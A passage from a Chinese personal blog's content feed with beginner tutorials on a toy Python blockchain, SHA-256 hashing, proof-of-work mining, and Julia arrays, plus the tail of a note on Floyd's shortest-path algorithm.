<h4 id="如何通过path矩阵寻找最短路径"><a href="#如何通过path矩阵寻找最短路径" class="headerlink" title="如何通过path矩阵寻找最短路径"></a>如何通过path矩阵寻找最短路径</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822165717520-166116762115213.png" alt></h4><p>弗洛伊德算法可以用于负权值带权图，但无法解决带有负权回路的图，这种图可能没有最短路径，如：<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220822170209802-166116762115215.png" alt></p>
<p>总结</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchains</title>
    <url>/2023/02/02/blockchains/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>实现区块链的第二步——手动化区块链的代码实现</p>
<span id="more"></span>
<p>在python中，块是简单的python字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block_1038 = &#123;</span><br><span class="line">    <span class="string">&#x27;index&#x27;</span>: <span class="number">1038</span>,</span><br><span class="line">    <span class="string">&#x27;timestamp&#x27;</span>: <span class="string">&quot;2020-02-25T08:07:42.170675&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;sender&#x27;</span>: <span class="string">&quot;bob&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;recipient&#x27;</span>: <span class="string">&quot;alice&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;amount&#x27;</span>: <span class="string">&quot;$5&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span>: <span class="string">&quot;83b2ac5b&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;previous_hash&#x27;</span>: <span class="string">&quot;2cf24ba5f&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最后两个字段hash和previous_hash，即区块1038包含区块1037的hash，而区块1037包含这区块1036的hash，以此可以回到第一个区块——创世纪区块</p>
<p>一个区块可以包含<em>任何</em>数据：文件、图像、交易、记录等。在前面的示例中，我们的区块包含从 Bob 到 Alice 的一笔交易，价格为 5 美元。这个区块类似于大多数加密货币区块（如比特币）的样子。您可能听说过人们将以太坊描述为“世界计算机”。这是因为以太坊区块还包含<em>可执行代码</em>作为其数据的一部分，指示网络上的参与者在区块链本身上执行操作。</p>
<p>不可变性和hash的重要性</p>
<p>每个区块都包含着前一个区块的hash值，形成一条链。hash的这种特性链接赋予了区块链不变性和防欺诈特性。</p>
<p>更具体地说，previous_hash字段是块之间用于创建<em>链</em>的链接。如果攻击者以某种方式破坏了链中的较早块，则所有后续块都将发生变化，因为它们的哈希值将不正确。例如，如果我们必须修改块 #1037 中的单个数据，那么 #1037 的哈希值会有所不同，因此 #1038 中的previous_hash值会有所不同。<strong>因此，如果任何早期区块中的单个比特被篡改，则此后的整个区块链都将无效。</strong>这就是区块链的链性质——它们由使用previous_hash哈希链保护。</p>
<h2 id="手动化区块链的代码实现"><a href="#手动化区块链的代码实现" class="headerlink" title="手动化区块链的代码实现"></a>手动化区块链的代码实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Blockchain</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.chain = []</span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;创建创世区块&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Creating genesis block&quot;</span>)</span><br><span class="line">        self.new_block()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_block</span>(<span class="params">self,previous_hash=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;生成一个新区块并将其添加到链中&#x27;&#x27;&#x27;</span></span><br><span class="line">        block = &#123;</span><br><span class="line">            <span class="string">&#x27;index&#x27;</span>:<span class="built_in">len</span>(self.chain),</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>:datetime.utcnow().isoformat(),</span><br><span class="line">            <span class="string">&#x27;transactions&#x27;</span>:self.pending_transactions,</span><br><span class="line">            <span class="string">&#x27;previous_hash&#x27;</span>:previous_hash,</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取新区块的hash值，并把hash值放入区块中&#x27;&#x27;&#x27;</span></span><br><span class="line">        block_hash = self.<span class="built_in">hash</span>(block)</span><br><span class="line">        block[<span class="string">&quot;hash&quot;</span>] = block_hash</span><br><span class="line">            </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;重置待交易列表&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;把区块添加到链中&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.chain.append(block)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Create block <span class="subst">&#123;block[<span class="string">&#x27;index&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">block</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;将python对象编码成Json字符串，sort_keys=True:是告诉编码器按照字典排序输出，否则可能出现不同的hash值&#x27;&#x27;&#x27;</span></span><br><span class="line">        block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;digest：返回摘要，作为二进制数据字符串值</span></span><br><span class="line"><span class="string">        hexdigest：返回摘要，作为十六进制数据字符串值&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> sha256(block_string).hexdigest()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">last_block</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回链中最后一个区块（如果有的话）&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.chain[-<span class="number">1</span>] <span class="keyword">if</span> self.chain <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_transaction</span>(<span class="params">self,sender,recipient,amount</span>):</span><br><span class="line">        self.pending_transactions.append(&#123;</span><br><span class="line">            <span class="string">&quot;recipient&quot;</span>:recipient,</span><br><span class="line">            <span class="string">&quot;sender&quot;</span>:sender,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>:amount,</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
<p>运行结果<br>初始化（创建创世区块）<br><img src="/2023/02/02/blockchains/image-20230202113544695.png" alt="image-20230202113544695"><br>手动添加交易<br>调用new_transaction函数<br><img src="/2023/02/02/blockchains/image-20230202113730398.png" alt="image-20230202113730398"><br>创建新区块，调用new_block函数，将上一个区块的hash填入新建区块的previous_hash中<br><img src="/2023/02/02/blockchains/image-20230202114848874.png" alt="image-20230202114848874"><br>输出现在的区块链<br><img src="/2023/02/02/blockchains/image-20230202114920312.png" alt="image-20230202114920312"></p>
<p>下一个目标实现自动化区块链</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链基础</title>
    <url>/2023/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>区块链的基础知识</p>
<span id="more"></span>
<h2 id="1-1-比特币内部结构"><a href="#1-1-比特币内部结构" class="headerlink" title="1.1 比特币内部结构"></a>1.1 比特币内部结构</h2><p><img src="/2023/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/image-20230201154207914.png" alt="image-20230201154207914"></p>
<ul>
<li>previous hash(前一个区块的hash)</li>
<li>merkle root(默克尔树根节点,内部存储交易数据)</li>
<li>timestamp(当前区块生成的时间)</li>
<li>nonce(旷工计算hash值次数)</li>
</ul>
<h2 id="1-2-实现的区块链数据结构"><a href="#1-2-实现的区块链数据结构" class="headerlink" title="1.2 实现的区块链数据结构"></a>1.2 实现的区块链数据结构</h2><ul>
<li>index 当前第几个区块</li>
<li>timestamp 该区块创建时的时间戳</li>
<li>data 交易信息</li>
<li>previousHash 前一个区块的hash</li>
<li>hash 当前区块的hash</li>
</ul>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>hash</title>
    <url>/2023/02/01/hash/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习区块链的第一步——认识哈希函数</p>
<span id="more"></span>
<p>从理论上讲，<strong>散列</strong>是识别数据的行为。这是一种为任何数据（句子、照片、电子表格或下载的程序）分配唯一随机值的特殊方法。您可以将哈希函数视为“识别机”，即为特定输入分配值的东西。输入是任意的 - 它可以是图像，文档，文件，原始字节，数字，以及您喜欢的任何内容 - 但<strong>对于相同的输入，输出始终是可预测</strong>的。</p>
<h2 id="python中的哈希"><a href="#python中的哈希" class="headerlink" title="python中的哈希"></a>python中的哈希</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 哈希函数期望字节作为输出，所以使用encode()方法将字符串转换为字节</span></span><br><span class="line">input_bytes = <span class="string">b&quot;akali&quot;</span></span><br><span class="line">output = hashlib.sha256(input_bytes)</span><br><span class="line"><span class="comment"># 使用hexdigest():将字节转换为16进制</span></span><br><span class="line"><span class="built_in">print</span>(output.hexdigest())</span><br></pre></td></tr></table></figure>
<p>运行结果<img src="/2023/02/01/hash/image-20230201132147109.png" alt="image-20230201132147109"></p>
<p>将akali改为akall，可以看到两个hash值差别极大<img src="/2023/02/01/hash/image-20230201132244490.png" alt="image-20230201132244490"></p>
<p>所以，输入的微小变化会导致输出的大变化</p>
<p>通常，如果哈希函数满足以下属性，则将其视为<strong>加密函数</strong>：</p>
<ul>
<li><strong>确定性：</strong>相同的输入始终产生相同的哈希值。</li>
<li><strong>难治性：</strong>除非耗尽（尝试大量可能的输入），否则无法找到给定哈希的输入。</li>
<li><strong>碰撞安全：</strong>找到输出相同哈希的两个不同输入是不可行的。</li>
<li><strong>雪崩效应：</strong>输入中的最小变化应该产生一个如此不同的哈希，以至于新哈希看起来与旧哈希不相关。</li>
<li><strong>速度：</strong>生成哈希的计算<em>速度很快</em>。</li>
</ul>
<h4 id="哈希函数的选择"><a href="#哈希函数的选择" class="headerlink" title="哈希函数的选择"></a>哈希函数的选择</h4><p>点对点区块链在其协议中选择了哈希函数：比特币使用<em>双</em>sha256，而以太坊使用keccak256。要知道的重要一点是，所有这些哈希函数都做同样的事情：它们为给定的输入提供可预测的输出。</p>
<h2 id="对图像进行hash处理"><a href="#对图像进行hash处理" class="headerlink" title="对图像进行hash处理"></a>对图像进行hash处理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;02.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)  <span class="comment"># rb参数表示文件应处于只读模式，并作为字节读取</span></span><br><span class="line"><span class="built_in">hash</span> = sha256(file.read()).hexdigest()</span><br><span class="line">file.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;图片的hash值为：<span class="subst">&#123;<span class="built_in">hash</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/01/hash/image-20230201132523953.png" alt="image-20230201132523953"></p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>可以用于验证从互联网下载的文件是否被第三方篡改，信誉良好的网站会宣传文件的哈希值（有时称为校验和）应该是什么，以便在本地验证。</p>
<h3 id="密码学思考"><a href="#密码学思考" class="headerlink" title="密码学思考"></a>密码学思考</h3><p>爱丽丝想要 通过不安全的渠道（如开放的互联网）向 Bob 发送电子邮件。鲍勃对其他人是否可以阅读电子邮件不感兴趣，但他希望确保它没有被篡改。Bob 如何验证电子邮件是否未被篡改？</p>
<p>解决方案：HMAC（哈希消息身份验证代码）的协议</p>
<ol>
<li>爱丽丝和鲍勃都有一个秘密短语S。</li>
<li>然后，Alice 创建消息 M 的哈希 H，并将机密附加到消息末尾：H = 哈希（M + S）。</li>
<li>Alice 将 H 和 M 发送给 Bob（消息和计算的哈希）。</li>
<li>Bob 通过自己计算 H 来检查消息完整性，以查看它是否与 Alice 宣传的哈希值相同 .</li>
</ol>
<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><ul>
<li>Alice和Bob拥有一个共同密钥为akali，记为S</li>
<li>Alice给Bob发送一个信息内容为“龟龟，云路亡我”，记为M</li>
<li>Alice计算H=hash(M+S)，并将H和M发送给Bob</li>
<li>Bob通过以下代码来对照hash值</li>
</ul>
<p>Alice加密过程<br><img src="/2023/02/01/hash/image-20230201150843340.png" alt="image-20230201150843340"><br>将”龟龟，云路亡我“和得到的hash值发送给Bob</p>
<p>Bob进行验证<br><img src="/2023/02/01/hash/image-20230201151101827.png" alt="image-20230201151101827"><br>可以看到hash值是一样的，所以在传输过程中，信息没有被篡改。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">secret_phrase = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash_with_secret_phrase</span>(<span class="params">input_data, secret_phrase</span>):</span><br><span class="line">    combined = input_data + secret_phrase</span><br><span class="line">    <span class="keyword">return</span> sha256(combined.encode()).hexdigest()</span><br><span class="line">email_body = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(get_hash_with_secret_phrase(email_body,  secret_phrase))</span><br></pre></td></tr></table></figure>
<h2 id="工作量证明-proofs-of-work"><a href="#工作量证明-proofs-of-work" class="headerlink" title="工作量证明(proofs of work)"></a>工作量证明(proofs of work)</h2><p>通过在M后面加上某个S，使得hash(M+S)满足一定需求，在比特币的应用里，diffcult=4时，需要hash值前面有4个0，假定hash生产256位，而满足这个条件的概率为$1/2^{4}$</p>
<p>在这个算法基础上可以看到机器计算一个符合条件的S是困难的，但是对于验证方来说验证时简单的</p>
<h2 id="简单构造区块链代码"><a href="#简单构造区块链代码" class="headerlink" title="简单构造区块链代码"></a>简单构造区块链代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>:</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,index,timestamp,data,previousHash=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        </span><br><span class="line">        self.index = index</span><br><span class="line">        self.timestamp = timestamp</span><br><span class="line">        self.data = data</span><br><span class="line">        self.previousHash = previousHash</span><br><span class="line">        self.nonce = <span class="number">0</span> <span class="comment">#代表当前计算了多少次hash计算</span></span><br><span class="line">        self.<span class="built_in">hash</span> = self.calculateHash()</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculateHash</span>(<span class="params">self</span>):</span><br><span class="line">        plainData = <span class="built_in">str</span>(self.index)+<span class="built_in">str</span>(self.timestamp)+<span class="built_in">str</span>(self.data)+<span class="built_in">str</span>(self.nonce)</span><br><span class="line">        <span class="keyword">return</span> sha256(plainData.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="comment">#挖矿 difficulty代表复杂度 表示前difficulty位都为0才算成功</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minerBlock</span>(<span class="params">self,difficulty</span>):</span><br><span class="line">        <span class="keyword">while</span>(self.<span class="built_in">hash</span>[<span class="number">0</span>:difficulty]!=<span class="built_in">str</span>(<span class="number">0</span>).zfill(difficulty)):<span class="comment"># 比较当前hash值前difficulty位是否为0</span></span><br><span class="line">            self.nonce+=<span class="number">1</span></span><br><span class="line">            self.<span class="built_in">hash</span> = self.calculateHash()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(self.__dict__)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BlockChain</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.chain = [self.createGenesisBlock()]</span><br><span class="line">        self.difficulty = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">createGenesisBlock</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> Block(<span class="number">0</span>,time.asctime(time.localtime(time.time())),<span class="string">&quot;Genesis Block&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getLatestBlock</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.chain[<span class="built_in">len</span>(self.chain)-<span class="number">1</span>]</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addBlock</span>(<span class="params">self,newBlock</span>):</span><br><span class="line">        newBlock.previousHash = self.getLatestBlock().<span class="built_in">hash</span></span><br><span class="line">        newBlock.minerBlock(self.difficulty)</span><br><span class="line">        self.chain.append(newBlock)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(self.__dict__)    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chainIsValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(self.chain)):</span><br><span class="line">            currentBlock = self.chain[index]</span><br><span class="line">            previousBlock = self.chain[index-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> (currentBlock.<span class="built_in">hash</span> != currentBlock.calculateHash()):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> previousBlock.<span class="built_in">hash</span> != currentBlock.previousHash:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">                  </span><br><span class="line">myCoin = BlockChain()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面打印了每个区块挖掘需要的时间 比特币通过一定的机制控制在10分钟出一个块 </span></span><br><span class="line"><span class="comment"># 其实就是根据当前网络算力 调整我们上面difficulty值的大小,如果你在</span></span><br><span class="line"><span class="comment"># 本地把上面代码difficulty的值调很大你可以看到很久都不会出计算结果</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;startMinerFirstBlockTime = time.time()</span></span><br><span class="line"><span class="string">print(&quot;start to miner first block time :&quot;+str(startMinerFirstBlockTime))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">myCoin.addBlock(Block(1,time.asctime(time.localtime(time.time())),&quot;second block&quot;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;miner first block time completed&quot; + &quot;,used &quot; +str(time.time()-startMinerFirstBlockTime) +&quot;s\n&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">startMinerSecondBlockTime = time.time()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;start to miner second block time :&quot;+str(startMinerSecondBlockTime))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">myCoin.addBlock(Block(2,time.asctime(time.localtime(time.time())),&quot;third block&quot;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(&quot;miner second block time completed&quot; + &quot;,used &quot; +str(time.time()-startMinerSecondBlockTime) +&quot;s\n&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Subsequent_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    startMinerFirstBlockTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start to miner %d block time :&quot;</span> %Subsequent_block +<span class="built_in">str</span>(startMinerFirstBlockTime) )</span><br><span class="line">    myCoin.addBlock(Block(Subsequent_block,time.asctime(time.localtime(time.time())),<span class="string">&quot;第%d个区块&quot;</span> % Subsequent_block ))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;miner %d block time completed&quot;</span>% Subsequent_block + <span class="string">&quot;,used &quot;</span> +<span class="built_in">str</span>(time.time()-startMinerFirstBlockTime) +<span class="string">&quot;s\n&quot;</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print block info</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;print block info ####:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> myCoin.chain:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(block)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#check blockchain is valid</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;before tamper block,blockchain is valid ###&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(myCoin.chainIsValid())</span><br><span class="line"></span><br><span class="line"><span class="comment">#tamper the blockinfo</span></span><br><span class="line">myCoin.chain[<span class="number">1</span>].data = <span class="string">&quot;&#123;amount:1002&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;after tamper block,blockchain is valid ###&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(myCoin.chainIsValid())</span><br></pre></td></tr></table></figure>
<p>该代码在创建完创世区块之后，又计算了4个新区块，其中minerBlock为工作量证明相关代码</p>
<p>输出结果<img src="/2023/02/01/hash/image-20230201171726099.png" alt="image-20230201171726099"></p>
]]></content>
      <tags>
        <tag>区块链</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>julia</title>
    <url>/2023/01/30/julia/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习julia语言</p>
<span id="more"></span>
<h1 id="julia数组"><a href="#julia数组" class="headerlink" title="julia数组"></a>julia数组</h1><p>数组，就是相同数据类型的元素按一定顺序排列的集合，可以是一维数组和多维数组。<br>Julia 支持数组数据结构，它可以存储一个大小不是固定的，类型可以相同也可以不同的顺序集合。<br>Julia 数组是可变类型集合，用于列表、向量、表格和矩阵。<br>Julia 数组的索引键值可以使用整数表示，数组的大小不是固定的。<br>Julia 提供了很多函数帮助我们来操作数组，比如数组添加元素，合并数组等。<br>Julia 数组用方括号 […] 指定，多个元素使用逗号 , 分隔。<br>创建一个一维数组(即一个向量)语法为:</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">[A,B,C,...]</span><br></pre></td></tr></table></figure>
<h2 id="创建一维数组"><a href="#创建一维数组" class="headerlink" title="创建一维数组"></a>创建一维数组</h2><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<p><img src="/2023/01/30/julia/image-20230130114920630.png" alt="image-20230130114920630"></p>
<p><img src="/2023/01/30/julia/image-20230130115038875.png" alt="image-20230130115038875"></p>
<p>创建的数组可以直接使用索引值来访问，第一个值的索引为 1（不是 0），第二个值索引为 2，以此类推，最后一个可以使用 <strong>end</strong> 表示：</p>
<p><img src="/2023/01/30/julia/image-20230130115605574.png" alt="image-20230130115605574"></p>
<h3 id="创建一个空数组"><a href="#创建一个空数组" class="headerlink" title="创建一个空数组"></a>创建一个空数组</h3><p><img src="/2023/01/30/julia/image-20230130115327515.png" alt="image-20230130115327515"></p>
<p>以上实例数组 <strong>arr3</strong> 限制只能输入整数，<strong>arr4</strong> 限制只能输入字符串。</p>
<h2 id="指定数组类型及维度"><a href="#指定数组类型及维度" class="headerlink" title="指定数组类型及维度"></a>指定数组类型及维度</h2><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>&#123;type&#125;(<span class="literal">undef</span>, dims...)</span><br></pre></td></tr></table></figure>
<p><strong>undef</strong> 表示数组未初始化。<br><strong>dims…</strong> 可以是维度的单多元组，也可以是维度作为可变参数时的一组值。<br><strong>dims…</strong> 数字表示元素个数，多个维度使用逗号 <strong>,</strong> 分隔。</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">julia&gt; array = <span class="built_in">Array</span>&#123;<span class="built_in">Int64</span>&#125;(<span class="literal">undef</span>, <span class="number">3</span>)   <span class="comment"># 表示一维数组，数组有 3 个元素</span></span><br><span class="line"><span class="number">3</span>-element <span class="built_in">Vector</span>&#123;<span class="built_in">Int64</span>&#125;:</span><br><span class="line"> <span class="number">4834342704</span></span><br><span class="line"> <span class="number">4377305096</span></span><br><span class="line">     <span class="number">0</span></span><br><span class="line"></span><br><span class="line">julia&gt; array = <span class="built_in">Array</span>&#123;<span class="built_in">Int64</span>&#125;(<span class="literal">undef</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>)   <span class="comment"># 表示 3 维数组，每个维度数组有 3 个元素</span></span><br><span class="line"><span class="number">3</span>×<span class="number">3</span>×<span class="number">3</span> <span class="built_in">Array</span>&#123;<span class="built_in">Int64</span>, <span class="number">3</span>&#125;:</span><br><span class="line">[:, :, <span class="number">1</span>] =</span><br><span class="line"> <span class="number">4562265712</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">     <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">     <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[:, :, <span class="number">2</span>] =</span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[:, :, <span class="number">3</span>] =</span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>以上实例中，数组的类型我们放在花括号中 <strong>{}</strong>， undef 用于设置数组未初始化为任何已知值，这就是我们在输出中得到随机数的原因。</p>
<h2 id="创建二维数组和矩阵"><a href="#创建二维数组和矩阵" class="headerlink" title="创建二维数组和矩阵"></a>创建二维数组和矩阵</h2><p>我们可以将数组元素中的逗号 <strong>,</strong> 省略掉或者使用两个冒号 <strong>;;</strong>，这样就可以创建一个二维数组了，如下实例：</p>
<p><img src="/2023/01/30/julia/image-20230130120933084.png" alt="image-20230130120933084"></p>
<p><strong>注意：</strong>第一行输出的 <strong>1×4 Matrix{Int64}:</strong>，1x4 表示一行四列的矩阵。|<br>虽然只有一行，也是二维数组，因为 Julia 只认可列向量，而不认可所谓的行向量。<br>要添加另一行，只需添加分号 <strong>;</strong>，看以下实例：</p>
<p><img src="/2023/01/30/julia/image-20230130121016370.png" alt="image-20230130121016370"></p>
<p>也可以使用冒号 <strong>:</strong> 和空格  来实现，看以下实例：</p>
<p><img src="/2023/01/30/julia/image-20230130121056843.png" alt="image-20230130121056843"></p>
